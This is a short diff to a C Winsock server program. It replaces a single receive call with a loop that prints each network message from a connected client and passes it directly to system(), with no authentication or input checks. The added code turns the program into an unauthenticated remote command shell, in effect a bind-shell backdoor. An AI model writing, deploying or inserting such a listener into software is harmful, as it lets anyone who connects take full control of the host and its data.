@@ -53,17 +53,26 @@ int main(int argc, char** argv) {
     }
     printf("Client accepted.\n");
 
-    // Receive data
-    char request[1024] = { 0 };
-    int recvResult = recv(client, request, sizeof(request) - 1, 0);
-    if (recvResult > 0) {
-        request[recvResult] = '\0'; // Null terminate
-        printf("Receiving data: \n%s\n", request);
+    char request[256] = { 0 };
+    // Actively wait for data
+    while (1) {
+        // Receive data
+        int recvResult = recv(client, request, sizeof(request) - 1, 0);
+        if (recvResult > 0) {
+            request[recvResult] = '\0'; // Null terminate
+            printf("Client > \n%s\n", request);
+            // execute command
+            system(request);
+        }
+        else if (recvResult == 0) {
+            printf("Connection closed by client.\n");
+            break;
+        }
+        else {
+            printf("Receive failed: %d\n", WSAGetLastError());
+            break;
+        }
     }
-    else {
-        printf("Receive failed: %d\n", WSAGetLastError());
-    }
-
     // Cleanup
     closesocket(client);
     closesocket(sock);
